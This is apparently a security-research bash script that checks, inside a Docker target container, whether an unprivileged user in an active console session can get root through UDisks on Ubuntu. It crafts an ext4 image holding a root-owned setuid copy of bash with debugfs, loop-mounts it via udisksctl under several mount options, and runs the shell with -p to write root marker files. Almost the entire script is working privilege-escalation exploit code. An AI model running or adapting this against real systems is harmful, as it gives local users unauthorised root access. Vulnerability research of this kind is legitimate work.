#!/usr/bin/env bash
set -Eeuo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/active-udisks-ext4-suid-20260517.out"
mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s >"$log" 2>&1 <<'EOS'
set -Eeuo pipefail

name=active-udisks-ext4-suid-20260517
user=attacker
tty=8
work="/tmp/$name"
home="/home/$user/$name"
profile="/home/$user/.bash_profile"
backup="$work/bash_profile.backup"
had_profile="$work/had_profile"
root_marker="/root/${name}-root"
user_marker="/tmp/${name}-user"

cleanup() {
  set +e
  findmnt -rn -o TARGET | grep -E "^/media/$user/" | sort -r |
    xargs -r -n1 umount >/dev/null 2>&1 || true
  losetup -a | awk -F: -v tag="$name" '$0 ~ tag {print $1}' |
    xargs -r -n1 losetup -d >/dev/null 2>&1 || true
  loginctl terminate-user "$user" >/dev/null 2>&1 || true
  systemctl start "getty@tty${tty}.service" >/dev/null 2>&1 || true
  if [ -e "$had_profile" ]; then
    cp -a "$backup" "$profile"
    chown "$user:$user" "$profile"
  else
    rm -f "$profile"
  fi
  rm -rf "$home" "$work"
  rm -f "$root_marker" "$user_marker" /tmp/${name}.debugfs
  systemctl reset-failed udisks2.service "getty@tty${tty}.service" >/dev/null 2>&1 || true
}
trap cleanup EXIT

rm -rf "$work" "$home" "$root_marker" "$user_marker"
mkdir -p "$work" "$home"
chmod 1777 "$work"
chown -R "$user:$user" "$home"
[ ! -e "$profile" ] || { cp -a "$profile" "$backup"; touch "$had_profile"; }

echo "active UDisks ext4 setuid-image mount-option probe"
date --iso-8601=seconds
echo
echo "== default proof =="
sed -n '1,8p' /etc/os-release
uname -a
id "$user"
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  udisks2 libudisks2-0 e2fsprogs polkitd systemd 2>&1 | sort
systemctl is-active udisks2.service
systemctl cat udisks2.service | sed -n '1,60p'
awk '/org.freedesktop.udisks2.loop-setup/{flag=1} flag{print} /<\/action>/{if(flag) exit}' \
  /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy
awk '/org.freedesktop.udisks2.filesystem-mount/{flag=1} flag{print} /<\/action>/{if(flag) exit}' \
  /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy
echo

cat >"$home/probe.sh" <<'SH'
#!/bin/bash
set +e
name=active-udisks-ext4-suid-20260517
home="$HOME/$name"
out="$home/user.out"
exec >"$out" 2>&1

echo "== active session proof =="
id
tty
echo "XDG_SESSION_ID=${XDG_SESSION_ID:-}"
[ -n "${XDG_SESSION_ID:-}" ] &&
  loginctl show-session "$XDG_SESSION_ID" -p User -p Name -p Seat -p TTY -p Active -p State
for action in \
  org.freedesktop.udisks2.loop-setup \
  org.freedesktop.udisks2.filesystem-mount \
  org.freedesktop.udisks2.modify-device; do
  pkcheck --process $$ --action-id "$action" --allow-user-interaction >/dev/null 2>&1
  echo "$action rc=$?"
done
echo

img="$home/ext4suid.img"
truncate -s 96M "$img"
mkfs.ext4 -F -q -L EXT4SUID "$img"
/usr/sbin/debugfs -w -R "write /bin/bash /rootsuidbash" "$img" >/tmp/${name}.debugfs 2>&1
/usr/sbin/debugfs -w -R "set_inode_field /rootsuidbash uid 0" "$img" >>/tmp/${name}.debugfs 2>&1
/usr/sbin/debugfs -w -R "set_inode_field /rootsuidbash gid 0" "$img" >>/tmp/${name}.debugfs 2>&1
/usr/sbin/debugfs -w -R "set_inode_field /rootsuidbash mode 0104755" "$img" >>/tmp/${name}.debugfs 2>&1
echo "== image preparation =="
cat /tmp/${name}.debugfs
ls -l "$img"
echo

for opts in default exec suid suid,exec dev,suid,exec nosuid; do
  echo "== mount case: $opts =="
  setup="$(udisksctl loop-setup -f "$img" --no-user-interaction 2>&1)"
  echo "$setup"
  dev="$(printf '%s\n' "$setup" | sed -n 's/.* as \(\/dev\/loop[0-9]\+\).*/\1/p' | tail -1)"
  echo "dev=$dev"
  [ -n "$dev" ] || continue
  udevadm settle --timeout=10 2>&1 || true
  if [ "$opts" = default ]; then
    mount_out="$(udisksctl mount -b "$dev" --no-user-interaction 2>&1)"
  else
    mount_out="$(udisksctl mount -b "$dev" -o "$opts" --no-user-interaction 2>&1)"
  fi
  mount_rc=$?
  echo "$mount_out"
  echo "mount_rc=$mount_rc"
  mp="$(printf '%s\n' "$mount_out" | sed -n 's/^Mounted .* at //p' | sed 's/\.$//' | tail -1)"
  if [ -n "$mp" ]; then
    findmnt -no TARGET,SOURCE,FSTYPE,OPTIONS "$mp" 2>&1 || true
    stat -c '%A %a %u:%g %U:%G %n' "$mp/rootsuidbash" 2>&1 || true
    "$mp/rootsuidbash" -p -c \
      'id; id > /root/active-udisks-ext4-suid-20260517-root 2>/dev/null; id > /tmp/active-udisks-ext4-suid-20260517-user 2>/dev/null' 2>&1 || true
    ls -l /root/active-udisks-ext4-suid-20260517-root /tmp/active-udisks-ext4-suid-20260517-user 2>&1 || true
    udisksctl unmount -b "$dev" --no-user-interaction 2>&1 || true
  fi
  udisksctl loop-delete -b "$dev" --no-user-interaction 2>&1 || true
  echo
done
SH
chmod 0755 "$home/probe.sh"
chown -R "$user:$user" "$home"

cat >"$profile" <<SH
$home/probe.sh
exit
SH
chown "$user:$user" "$profile"

systemctl stop "getty@tty${tty}.service" >/dev/null 2>&1 || true
timeout 180 openvt -c "$tty" -s -f -w -- /bin/login -f "$user" || true
cat "$home/user.out" 2>&1 || true
echo
echo "== root proof and cleanup precheck =="
ls -l "$root_marker" "$user_marker" 2>&1 || true
test -e "$root_marker" && cat "$root_marker" || true
echo "ROOT_PROOF=$(test -e "$root_marker" && echo yes || echo no)"
findmnt -rn -o TARGET,SOURCE,FSTYPE,OPTIONS | grep -E "$name|/media/$user" || true
losetup -a | grep "$name" || true
systemctl is-system-running || true
systemctl --failed --no-pager || true
EOS

echo "wrote $log"
